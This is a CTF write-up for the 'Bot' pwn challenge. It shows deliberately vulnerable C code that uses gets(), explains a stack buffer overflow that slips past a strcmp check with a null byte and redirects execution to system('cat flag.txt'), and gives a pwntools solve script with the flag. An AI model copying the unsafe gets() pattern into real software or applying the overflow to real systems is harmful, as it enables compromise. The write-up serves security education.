## Bot

#### TL;DR
Binary wants us to ask it politely for the flag. We very impolitely smash the stack. 

#### Vulnerable source code
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(void) {
  setbuf(stdout, NULL);
  char input[64];
  volatile int give_flag = 0;
  puts("hi, how can i help?");
  gets(input);
  if (strcmp(input, "give me the flag") == 0) {
    puts("lol no");
  } else if (strcmp(input, "please give me the flag") == 0) {
    puts("no");
  } else if (strcmp(input, "help, i have no idea how to solve this") == 0) {
    puts("L");
  } else if (strcmp(input, "may i have the flag?") == 0) {
    puts("not with that attitude");
  } else if (strcmp(input, "please please please give me the flag") == 0) {
    puts("i'll consider it");
    sleep(15);
    if (give_flag) {
      puts("ok here's your flag");
      system("cat flag.txt");
    } else {
      puts("no");
    }
  } else {
    puts("sorry, i didn't understand your question");
    exit(1);
  }
}
```

The buffer is 64 character, but the binary uses gets so we instantly get a buffer overflow :D
Strcmp stops at the null terminator, so all we need to do is to send: "please please please give me the flag" + "\x00" + offset + ret addr
In this case, the ret addr would be 0x0040128e which corresponds to calling system to cat the flag file. 

#### Solve script
```python
from pwn import *

#proc = process("./bot")
proc = remote("lac.tf", 31180)
padding = b"please please please give me the flag\x00"
padding += cyclic(cyclic_find("aaja"))
rip = p64(0x0040128e)
#payload = b"please please please give me the flag\x00aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae"
payload = padding + rip
print(payload)

proc.sendline(payload)
proc.interactive()
proc.close()
```

The flag is lactf{hey_stop_bullying_my_bot_thats_not_nice}.
